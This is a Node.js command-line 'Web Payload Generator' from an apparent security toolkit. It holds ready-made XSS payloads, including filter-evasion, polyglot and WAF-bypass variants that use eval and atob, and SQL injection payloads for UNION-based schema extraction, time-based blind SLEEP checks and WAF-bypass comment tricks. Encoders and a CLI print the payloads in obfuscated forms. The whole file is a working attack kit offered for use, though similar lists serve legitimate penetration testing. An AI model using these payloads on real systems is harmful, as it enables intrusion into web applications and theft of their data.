#!/usr/bin/env node
/**
 * CyberSec Toolkit — Web Payload Generator
 * Fixed: Proper encoding, added WAF evasion, polyglot payloads
 */

const encode = {
    url: (str) => encodeURIComponent(str),
    html: (str) => str.replace(/[<>&"']/g, c => `&#${c.charCodeAt(0)};`),
    hex: (str) => str.split('').map(c => `\\x${c.charCodeAt(0).toString(16).padStart(2,'0')}`).join(''),
    unicode: (str) => str.split('').map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4,'0')}`).join(''),
    base64: (str) => Buffer.from(str).toString('base64'),
    js8: (str) => str.split('').map(c => `\\${c.charCodeAt(0).toString(8)}`).join(''),
};

const xssPayloads = {
    basic: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
    ],
    evasion: [
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<img src=x onerror=alert&#40;1&#41;>',
        '"><svg/onload=alert(1)>',
        '<a href="javascript:alert(1)">click</a>',
        '<object data="javascript:alert(1)">',
    ],
    polyglot: [
        `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`,
        `"'--><svg onload=alert()><!"`,
    ],
    wafBypass: [
        '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
        '<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        '<img src=x onerror=top[8680439..toString(30)](1)>',
        '<script>eval("\\u0061\\u006c\\u0065\\u0072\\u0074(1)")</script>',
    ]
};

const sqliPayloads = {
    error: [
        "' OR '1'='1",
        '" OR "1"="1',
        "1' AND 1=1--",
        "1' AND 1=2--",
        "' UNION SELECT null,null--",
    ],
    union: [
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT null,version(),null--",
        "' UNION SELECT null,table_name,null FROM information_schema.tables--",
    ],
    blind: [
        "' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND 1=IF(2>1,SLEEP(5),0)--",
    ],
    wafBypass: [
        "1'/**/AND/**/1=1/**/--",
        "1'%0bAND%0b1=1%0b--",
        "1'/*!50000AND*/1=1--",
        "1'+AND+1=1+--",
    ]
};

function generatePayload(type, category, encodeType = null) {
    const payloads = type === 'xss' ? xssPayloads : sqliPayloads;
    const selected = payloads[category] || [];
    
    if (encodeType && encode[encodeType]) {
        return selected.map(p => ({
            original: p,
            encoded: encode[encodeType](p),
            encoding: encodeType
        }));
    }
    return selected.map(p => ({ original: p }));
}

function main() {
    const args = process.argv.slice(2);
    const command = args[0];
    
    if (!command || command === 'help') {
        console.log(`
CyberSec Payload Generator
Usage:
  node payload_generator.js xss <category> [encoding]
  node payload_generator.js sqli <category> [encoding]
  node payload_generator.js encode <type> <string>
  
Categories:
  xss: basic, evasion, polyglot, wafBypass
  sqli: error, union, blind, wafBypass
Encodings: url, html, hex, unicode, base64, js8
        `);
        return;
    }
    
    if (command === 'encode') {
        const [type, ...strParts] = args.slice(1);
        const str = strParts.join(' ');
        if (encode[type]) {
            console.log(encode[type](str));
        } else {
            console.error(`Unknown encoding: ${type}`);
        }
        return;
    }
    
    const type = command;
    const category = args[1];
    const encoding = args[2];
    
    const results = generatePayload(type, category, encoding);
    results.forEach((p, i) => {
        console.log(`\n[${i + 1}] ${type.toUpperCase()} Payload`);
        console.log(`Original: ${p.original}`);
        if (p.encoded) console.log(`Encoded (${p.encoding}): ${p.encoded}`);
    });
}

main();
